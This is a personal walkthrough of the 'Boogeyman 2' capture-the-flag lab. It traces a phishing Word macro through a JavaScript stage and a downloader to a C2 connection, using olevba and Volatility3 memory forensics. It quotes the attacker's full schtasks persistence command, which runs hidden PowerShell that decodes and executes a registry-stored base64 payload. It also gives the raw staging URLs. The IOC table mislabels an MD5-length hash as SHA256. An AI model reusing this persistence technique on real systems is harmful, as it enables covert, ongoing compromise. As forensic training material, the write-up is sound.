Boogeyman 2
--------------

## TL;DR Summary

- **Initial Vector**: Phishing email with .doc macro payload
- **Stage 1**: Malicious macro calls Stage 2 from external URL
- **Stage 2**: JS script (`update.js`) executed via `wscript.exe`
- **Stage 3**: Downloader `Updater.exe` communicates with C2 (port 8080)
- **Persistence**: Established using `schtasks` + encoded PowerShell
- **Tools Used**: olevba, Volatility3 (pstree, netscan, dumpfiles), strings
- **Key Skills Demonstrated**: Memory forensics, malware staging, live artifact triage, persistence detection


---

# **Full Investigation**


## Analysis 1

- **Phishing Email Sender**: `[REDACTED]@outlook.com`
- **Victim Email**: `[REDACTED]@onmicrosoft.com`
- **Malicious Attachment**: `Resume_WesleyTaylor.doc`
- **Renamed Locally**: `Malware.doc`
- **Malicious File Hash**: `52c4384a0b9e248b95804352ebec6c5b`

Seems the malware is in separate stages, there is at least a stage 2

used the olevba tool to find more info: ```olevba Malware.doc```

found a URL for the stage 2 payload download:
```https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png``` 

The windows process that executed the stage2 payload was 'wscript.exe'

full path of the stage 2 payload: ```C:\ProgramData\update.js```

Have to dive into forensics now to pull out more information, Volatility3 style

Vol3 Commands:

**Volatility3 usage:**
```vol -f WKSTN-2961.raw <plugin>```

**for plugins**
```
vol -f WKSTN-2961.raw -h

plugins of choice:

windows.pstree.PsTree
windows.psscan.PsScan
windows.pslist.PsList
windows.strings.Strings
```

**Trying first:**

```vol -f WKSTN-2961.raw windows.pstree.PsTree```
```vol -f WKSTN-2961.raw windows.netscan.NetScan```

found the pid of stage 2 being 4260

using pstree i can see the hierarchy of the processes.

the parent process of wscripts.exe is WINWORD.EXE with a PID of 1124

```windows.strings.Strings``` doesn't seem to work here

**Quick Note: I originally answered question 10 by pasting the answer from question 5 and accidentally "autocorrected" .png to .exe. It turned out correct, but I wanted to know how to actually find the answer instead. So I paused and researched, That process is documented below.**



## Research 1

using ```vol -f WKSTN-2961.raw windows.filescan | grep -i update``` to find more information

found update[1].exe

using ```vol -f WKSTN-2961.raw windows.dumpfiles --virtaddr 0xe58f8928f8b0``` to dump the file we need for forensics

checking it's filetype and contents:
```file 'file.0xe58f8928f8b0.0xe58f838dd360.DataSectionObject.update[1].exe.dat'```

```cat 'file.0xe58f8928f8b0.0xe58f838dd360.DataSectionObject.update[1].exe.dat'```

nothing useful so far.

more research results more methods

```strings WKSTN-2961.raw | grep boogeymanisback.lol```

found the update.exe's webserver URL: 
```https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe```

using the netscan plugin to find any clues about what process was used to establish C2 connection:

once again, like in Boogeyman 1, the boogeyman really likes port 8080, checking the answer of the PID of the suspected process updater.exe


## Analysis 2

PID: 6216

turns out correct, and updater.exe is the malicious process used

full file path: ```C:\Windows\Tasks\Updater.exe```

C2 IP Address and port: ```[REDACTED]```

full filepath of the malicious .doc file email attachment:

```\Users\[REDACTED]\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc```

last question might need a bit of research again.. i forget the keywords for finding scheduled processes..


## **Research 2**

okay, after some googling, tried the keyword "schedule" with grep: ``vol -f WKSTN-2961.raw windows.filescan | grep -i "schedule"``

windows uses something called Microsoft Windows Task Scheduler, thats in the path: ``\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler``

maybe this is useful information

after some more research, event log IDs might hold the key, with 106 for task creation and 140 for updates being important perhaps

...maybe not? can't seem to find a plugin for event IDs

with some more research i found from a walkthrough, using ``strings WKSTN-2961.raw | grep schtasks``

found the answer

Full Command:

```schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"';'Schtasks persistence established using listener http stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Updater daily trigger at 09:00.```

```"schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"``` was the answer.




**Finished CTF**⠀⠀⠀⠀⠀⠀⠀⠀


## Lessons Learned

- Validated the importance of PID tracking across processes during staged malware execution.
- Learned that doing my own investigation rather than guessing the answer is more important, and learning the process to finding that answer.
- Reaffirmed that persistence often lives in plain sight (`schtasks`, registry) but requires familiarity with Windows internals.


## IOCs

| Type         | Value                                                                 |
|--------------|-----------------------------------------------------------------------|
| SHA256 Hash  | 52c4384a0b9e248b95804352ebec6c5b                                      |
| C2 IP        | [REDACTED]                                                            |
| URL (Stage 2) Defanged| hxxps[://]files[.]boogeymanisback[.]lol/[.][.][.]/update[.]png                     |
| URL (Stage 3) Defanged| hxxps[://]files[.]boogeymanisback[.]lol/[.][.][.]/update[.]exe                       |
| File Path    | C:\ProgramData\update.js                                              |
| Scheduled Task | `Updater` - daily at 09:00                                          |

